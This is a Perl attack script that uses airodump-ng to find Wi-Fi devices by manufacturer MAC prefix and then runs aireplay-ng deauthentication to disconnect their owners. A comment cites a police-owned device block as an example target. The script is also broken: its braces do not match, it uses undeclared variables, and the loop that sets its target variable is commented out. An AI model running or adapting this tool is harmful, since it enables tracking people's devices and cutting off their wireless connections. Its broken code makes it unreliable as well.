#!/usr/bin/perl

# mac addresses of ANY type of device/wifiAP's we want to attack
# ex.(TPD owns the 00:15:FF Verizion-MiFi block of MACs and a few others)
# see here: http://standards.ieee.org/develop/regauth/oui/oui.txt
my @device_macs = qw/99:00:11/; #replace with arugment option

use strict;

# my Wireless Interfaces
my $interface  = shift || "mon0";


# paths to applications
my $iwconfig	= "iwconfig";
my $ifconfig	= "ifconfig";
my $airmon	= "airmon-ng";
my $aireplay	= "aireplay-ng";
my $aircrack	= "aircrack-ng";
my $airodump	= "airodump-ng";



# put device into monitor mode
sudo($ifconfig, $interface, "down");

#sudo($airmon, "start", $interface);

# tmpfile for ap output
my $tmpfile = "/mnt/ram/OUI-Prox";


while (1)
{

		# show user APs
		eval {
			local $SIG{INT} = sub { die };
			my $pid = open(DUMP, "|sudo $airodump -c 1,6,11 --output-format csv -w  $tmpfile $interface >>/dev/null 2>>/dev/null") || die "Can't run airodump ($airodump): $!";
			print "pid $pid\n";

			# wait 10 seconds then kill. Can be ADJ for longer or shorter. Long will capture more to short will capture less.
			sleep(20);
			print DUMP "\cC";
			sleep 1;
			sudo("kill", $pid);
			sleep 1;
			sudo("kill", "-HUP", $pid);
			sleep 1;
			sudo("kill", "-9", $pid);
			sleep 1;
			sudo("killall", "-9", $aireplay, $airodump);
			#kill(9, $pid);
			close(DUMP);
		};

		sleep 2;
		# read in APs
		my %clients;
		my %chans;
		foreach my $tmpfile1 (glob("$tmpfile*.csv"))
		{
				open(APS, "<$tmpfile1") || print "Can't read tmp file $tmpfile1: $!";
				while (<APS>)
				{
					# strip weird chars
					s/[\0\r]//g;

					foreach my $dev (@device_macs)
					{

						
						# determine the channel
						if (/^($dev:[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),/)

						{
							print "CHANNEL $1 $2 $3\n";
							$chans{$1} = [$2, $3];
							if ($oui_match) {
							#Sense-hat Config: If you dont have one add "#" to this line or del it
  						  	my $message = "MESSAGE TEXT: $oui_match";
    							my $sense = new SenseHat;
    							$sense->show_message($message);
							$sense->show_message($message, text_colour => [255, 0, 0]);
						
						}

						# grab our device MAC and owner MAC
						if (/^([\w:]+).*\s($dev:[\w:]+),/) # best so far that i can think of
						#if (/^([\w:]+).*\s(?<dev>\b[\w:]+)\b.*(?<oui>[\w]{6})/) #please find a better way
						{

							print "CLIENT $1 $2\n";
							$clients{$1} = $2;
#							sleep 3;
						}
					}
				}
				close(APS);
				sudo("rm", $tmpfile1);
				#unlink($tmpfile1);
		}
		print "\n\n";
#
#		foreach my $cli (keys %clients)
#		{
#			print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";
#			#sudo ("omxplayer", "-o", "local","--vol", "600", "/root/OUI-Detect/bluealert.ogg");
#			#Put code to blink a led 2 times on GPIO 21 for the raspberry pi.
#			
			#Unmark to activate Deauth upon Detection.
			#Hop onto the channel of the ap
			print "Jumping onto Device's channel $chans{$clients{$cli}}[0]\n\n";
#			sudo($airmon, "start", $interface, $chans{$clients{$cli}}[0]);
			sudo($iwconfig, $interface, "channel", $chans{$clients{$cli}}[0]);
			sudo("iw", "phy", "phy1", "set", "channel", $chans{$clients{$cli}}[0]);

			#sleep(1);

			# now, disconnect the TRUE owner of the Device.
			# sucker.
			#print "Disconnecting the true owner of the device ;)\n\n";
			#sudo ("espeak", "Deauth in progress");
			#Put sense-hat alert code here
			sudo($aireplay, "-0", "3", "-a", $clients{$cli}, "-c", $cli, "mon1");
#			sudo("airmon-ng", "stop", "mon1");


		}

	sleep 2;
}

	
sub sudo
{
	print "Running: @_\n";
	system("sudo", @_);
}
